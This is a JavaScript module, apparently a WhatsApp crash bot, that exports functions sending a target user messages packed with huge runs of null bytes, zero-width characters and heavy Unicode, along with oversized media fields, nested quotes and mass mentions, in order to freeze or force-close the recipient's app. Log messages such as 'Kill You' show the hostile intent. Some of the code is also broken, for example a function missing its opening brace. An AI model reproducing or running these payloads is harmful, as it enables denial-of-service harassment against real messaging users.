async function blank(target) {
    console.log("🌎NASA");

    const henshing = "\u200B\u200C\u200D\uFEFF";
    const blankPayload = henshing.repeat(150000);

    const randomDelay = (ms) => new Promise(res => setTimeout(res, ms));
    const pekaidi = "<!> KynaX Payload" + Math.random().toString(36).substring(2, 15);

    try {
        await randomDelay(2000 + Math.random() * 3000);

        await sock.sendMessage(target, {
            text: " ͢KyñäX ͢Āmpās ͢Mōdē" + blankPayload,
            contextInfo: {
                quotedMessage: {
                    conversation: "𝐊͢𝐲͡𝐧𝐚͜𝐗 ͢𝐈͡𝐧𝐯𝐢͜𝐜𝐭𝐮͢𝐬͡ ͢  ͢ " + blankPayload
                },
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                stanzaId: pekaidi,
                externalAdReply: {
                    title: "🗿",
                    body: "Ampas? Sorry Deck Functnya Lum Gacor ya Masi Pemula Soalnya😹" + Math.floor(Math.random() * 999),
                    previewType: "PHOTO",
                    thumbnail: Buffer.alloc(0),
                    sourceUrl: "https://whatsapp://call?phone=13135550002"
                }
            }
        }, { messageId: pekaidi });

        console.log(`✅ Send to ${target}`);
    } catch (err) {
        console.log("\n" + err);
    }
}

async function stellarbriliance8(target) {
  try {
    const briliance = "ꦽ".repeat(60000) + "\u0000".repeat(10000) + "\u200b".repeat(20000);
    const mnt = Array(500).fill(target);

    const beatrix = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: briliance,
              hasMediaAttachment: true,
              productMessage: {
                product: {
                  productImage: { url: "https://pornhub.com", mimetype: "image/jpeg" },
                  productId: briliance,
                  title: briliance,
                  currencyCode: "IDR",
                  priceAmount1000: 9999999
                },
                businessOwnerJid: target
              }
            },
            body: { text: briliance },
            nativeFlowMessage: {
              buttons: [{
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({ display_text: briliance, id: briliance })
              }],
              cards: Array(10).fill({
                header: { title: briliance, hasMediaAttachment: false },
                body: { text: briliance },
                nativeFlowMessage: {
                  buttons: [{ name: "cta_url", buttonParamsJson: `{"display_text":"${briliance}","url":"wa.me/settings"}` }]
                }
              })
            },
            contextInfo: {
              mentionedJid: mnt,
              externalAdReply: {
                title: briliance,
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnail: Buffer.alloc(200),
                sourceUrl: "wa.me/settings"
              },
              quotedMessage: {
                pollCreationMessageV3: {
                  name: briliance,
                  options: [{ optionName: briliance }, { optionName: briliance }]
                },
                stickerMessage: {
                  url: "https://wa.me/stickerpack/MarkZuckerberg",
                  mimetype: "image/webp",
                  fileSha256: Buffer.alloc(32)
                },
                paymentInviteMessage: { serviceType: 1 },
                requestPaymentMessage: { amount1000: 99999, currencyCodeIso4217: "IDR" },
                sendPaymentMessage: { paymentConfirmationMessage: { conversation: briliance } }
              }
            }
          },
          protocolMessage: { type: 0 }
        }
      }
    };

    await sock.relayMessage(target, beatrix, { 
      participant: "0@s.whatsapp.net",
      messageId: "Ɣ" + Date.now(),
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target }, content: undefined }] }]
      }]
    });

    console.log(`Ɣ sturdust bulldoz to ${target}\n`);
  } catch (e) {
    console.log("Ɣ sturdust engoing:\n" + e);
  }
}

async function stellarbriliance7(target) {
  try {
    const kynax = "ꦾ".repeat(400000);
    const briliance = {
      callLogMessage: {
        isVcardOverLvl: true,
        callOutcome: 1,
        callDuration: 5
      },
      documentMessage: {
        url: "wa.me/settings",
        mimetype: "application/pdf",
        title: 'Expos3d By YifanModss' + '\u0000'.repeat(100000) + '\u200b'.repeat(100000),
        fileName: kynax,
        contextInfo: { 
          isForwarded: true,
          forwardingScore: 15
        }
      }
    };
    await sock.relayMessage(target, briliance, {
     participant: { jid: target },
     messageId: briliance.key.id,
     statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
     });
    console.log(`✅ تم إرسال رسالة نجاح من كيناكس بغس ت ترغة : ${target}`);
  } catch (e) {
    console.log("\n" + e);
  }
}

async function upinipin(target) {
    const fc = "\u0000".repeat(5000);
    const blank = "\u200B".repeat(120000);
    const hardDelay = "\u17b4\u17b5".repeat(60000);
    const totalCancer = fc + blank + hardDelay
    
    const kynaxsad = {
        forwardingScore: 2026,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: `123456${Math.floor(Math.random() * 1000000)}@newsletter`,
            serverMessageId: 1,
            newsletterName: "#KynaX Invictus Kill You¿?" + "\u200B".repeat(800)
        },
        quotedMessage: {
            orderMessage: {
                orderId: 'YifanModss-KynaX-KeyWork' + Date.now(), //unique id
                thumbnailUrl: 'https://d.uguu.se/YXEjbTTg.jpeg',
                itemCount: 9999,
                status: 1,
                surface: 1,
                message: "*KynaX Invictus Kill You?!‽*\n" + totalCancer
            }
        }
    };

    try {
        await sock.sendMessage(target, {
            text: "*YifanTzyy is K!ng?👑 No, No!z*" + totalCancer,//start invis
            contextInfo: kynaxsad
        }, { 
            ephemeralExpiration: 604800//expired 1m target
        });
        
        console.log(`</> KynaX Payload Succes Send to </> : ${target}`);
    } catch (err) {
        console.error(`[ </> UpinIpin, Power Rangers, Kamen Rider, Ultraman, EjenAli, Boboiboy, Grizzy&LesLemmings, Rabbids Invasion </> ]:\n ${err}`);
    }
}

async function ForcloseNgt(target) {
    if (!target.includes("@")) target = target + "@s.whatsapp.net";
    
    const nullBytes = "\u0000".repeat(100000);
    const specialChar = "𑇂".repeat(90000);
    const hanzyText = "YifanModss".repeat(50000);
    
    const payload = {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/fake.enc",
            mimetype: "image/jpeg",
            caption: hanzyText + nullBytes,
            fileLength: "99999999999999999999999999999999",
            height: 999999999,
            width: 999999999,
            mediaKey: "xWD083UnPcnqnBtnLbpqQHCFI5u35p5AzGFLHzGR7CM=",
            fileSha256: Buffer.alloc(800000, 0xFF),
            fileEncSha256: Buffer.alloc(800000, 0xFF),
            contextInfo: {
                quotedMessage: {
                    quotedMessage: {
                        quotedMessage: {
                            imageMessage: {
                                caption: specialChar,
                                fileLength: "99999999999999999999999999999999"
                            }
                        }
                    }
                },
                forwardingScore: 200,
                isForwarded: true
            }
        }
    };
    
    await sock.relayMessage(target, payload, {}).catch(() => {});
}

async function CrashMemek(target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "YifanTzyy",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "`ꦻ⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝ោ࣯࣯៝" + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: target } });
}

async function buttonnull(target) {
    const spamMessage = "".repeat(1);
    const crashMessage = "ꦽ".repeat(10200);
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    extendedTextMessage: {
                        text: "`YifanModss`\n" + crashMessage,
                        previewType: spamMessage,
                        contextInfo: {
                            mentionedJid: [
                                target, 
                            ],
                        },
                    },
                },
            },
        },
        {
            participant: {
                jid: target,
            },
        }
    );
}

async function sendOfferCall(target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:\n`, error));
    }
}
async function DelayVisiYifanTzyy(target)
try {
 await sock.offerCall(target)
 await new Promise(ytzyy => setTimeout(ytzyy,5000))
 await sock.sendMessage(target, {
  interactiveMessage: {
    body: { text: "\u0000".repeat(300000) },
    footer: { text: "\u200b".repeat(30000) },
    nativeFlowMessage: {
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "⛓️ Expos3d By YifanModss",
            id: "menu"
          })
        }
      ]
    }
  }
}), { participant: { jid: target }, messageId: null }
} catch (e) {console.log(e)}

module.exports = { upinipin, CrashMemek, buttonnull, ForcloseNgt, sendOfferCall, stellarbriliance7, stellarbriliance8, blank }